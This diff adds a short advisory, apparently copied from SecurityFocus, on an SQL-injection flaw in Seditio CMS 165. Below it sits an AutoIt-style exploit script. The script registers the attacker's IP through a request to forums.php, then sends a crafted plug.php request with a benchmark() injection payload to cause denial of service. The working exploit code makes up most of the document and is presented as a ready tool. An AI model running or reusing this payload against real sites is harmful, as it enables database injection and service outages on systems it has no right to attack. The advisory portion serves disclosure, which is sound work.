@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/53036/info
+
+Seditio CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Seditio CMS 165 is vulnerable; prior versions may also be affected. 
+
+$exploit=$targetsite & "/plug.php?e=akastep',rd_location=(benchmark(unix_timestamp(now()),sha1(md5(now())))),rd_ip='" & @IPAddress1 & "',rd_lastseen='"; //Our exploit.
+$first=$targetsite & '/forums.php'; // our 1'st request will go here.
+
+HttpSetUserAgent("I'm Denial Of Service Exploit for Seditio 165 throught sql injection"); //setting user agent 4 fun
+InetGet($first,'',1);// first request.After this our IP address will be inserted to table sed_redirecter.It is neccessary to exploit.
+Sleep(1500); //sleeping 1.5 second (*Waiting operation*)
+HttpSetUserAgent("Exploiting!!!!");//setting our user agent again 4 fun.
+InetGet($exploit,'',1,1) ; Now exploiting it with *do not wait* responce option.Until now We exploiting sql injection and causing Denial Of Service.
+Exit; //exit from exploit
